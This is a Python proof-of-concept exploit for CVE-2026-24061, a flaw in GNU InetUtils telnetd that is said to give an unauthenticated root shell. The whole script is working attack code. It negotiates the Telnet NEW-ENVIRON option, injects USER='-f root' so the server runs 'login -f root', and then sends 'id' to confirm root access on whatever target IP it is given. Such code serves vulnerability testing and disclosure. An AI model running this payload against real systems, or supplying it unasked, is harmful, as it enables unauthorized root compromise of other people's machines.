#!/usr/bin/env python3
"""
CVE-2026-24061 - Simple Proof of Concept
GNU InetUtils telnetd unauthenticated root shell via NEW-ENVIRON injection.

This is the minimal, readable version of the exploit. It demonstrates the
core vulnerability in ~60 lines of code with no abstraction layers.

The vulnerability:
    telnetd passes client-supplied environment variables directly to login(1).
    By setting USER="-f root" via the Telnet NEW-ENVIRON option (RFC 1572),
    the server executes "login -f root", granting a root shell without
    any credentials.

Usage:
    python3 poc_cve_2026_24061.py <target_ip> [port]

Example:
    python3 poc_cve_2026_24061.py 192.168.1.100
    python3 poc_cve_2026_24061.py 10.0.0.5 2323
"""

import socket
import sys
import time

# Telnet protocol bytes (RFC 854)
IAC  = b'\xff'   # Interpret As Command
DO   = b'\xfd'
WILL = b'\xfb'
WONT = b'\xfc'
DONT = b'\xfe'
SB   = b'\xfa'   # Sub-negotiation Begin
SE   = b'\xf0'   # Sub-negotiation End

# NEW-ENVIRON option (RFC 1572)
NEW_ENVIRON = b'\x27'  # Option 39
IS    = b'\x00'
SEND  = b'\x01'
VAR   = b'\x00'
VALUE = b'\x01'


def exploit(host: str, port: int = 23, timeout: int = 5) -> None:
    """
    Send the CVE-2026-24061 payload and attempt to obtain a root shell.

    The exploit flow:
        1. Connect to telnetd
        2. Server sends IAC DO NEW-ENVIRON
        3. We reply IAC WILL NEW-ENVIRON
        4. Server sends IAC SB NEW-ENVIRON SEND IAC SE
        5. We inject: IAC SB NEW-ENVIRON IS VAR "USER" VALUE "-f root" IAC SE
        6. Server calls: login -f root -> root shell
    """
    print(f"[*] Connecting to {host}:{port}")
    sock = socket.create_connection((host, port), timeout=timeout)

    # Malicious payload: USER = "-f root"
    payload = (
        IAC + SB + NEW_ENVIRON + IS
        + VAR + b"USER"
        + VALUE + b"-f root"
        + IAC + SE
    )

    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            data = sock.recv(1024)
        except socket.timeout:
            break

        if not data:
            break

        # Walk through IAC commands
        i = 0
        while i < len(data) - 2:
            if data[i:i+1] != IAC:
                i += 1
                continue

            cmd = data[i+1:i+2]
            opt = data[i+2:i+3]

            if cmd == DO and opt == NEW_ENVIRON:
                # Step 2-3: agree to send environment variables
                sock.sendall(IAC + WILL + NEW_ENVIRON)

            elif cmd == SB and opt == NEW_ENVIRON:
                # Step 5: inject the malicious USER variable
                print(f"[*] Injecting USER=\"-f root\" via NEW-ENVIRON")
                sock.sendall(payload)

            elif cmd == DO:
                # Refuse all other options
                sock.sendall(IAC + WONT + opt)

            elif cmd == WILL:
                sock.sendall(IAC + DONT + opt)

            i += 3

    # Check if we got a shell
    print("[*] Sending 'id' to verify access")
    sock.sendall(b"id\n")
    time.sleep(0.5)

    try:
        response = sock.recv(4096).decode(errors='ignore')
    except socket.timeout:
        response = ""

    if "uid=0(root)" in response:
        print(f"[+] VULNERABLE - root shell obtained!")
        print(f"[+] Response: {response.strip()}")
    elif "Login incorrect" in response or "Password:" in response:
        print(f"[-] Not vulnerable (authentication enforced)")
    else:
        print(f"[?] Unclear response: {response.strip()[:200]}")

    sock.close()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip> [port]")
        sys.exit(1)

    target = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 23

    try:
        exploit(target, target_port)
    except ConnectionRefusedError:
        print(f"[-] Connection refused: {target}:{target_port}")
    except socket.timeout:
        print(f"[-] Connection timed out: {target}:{target_port}")
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
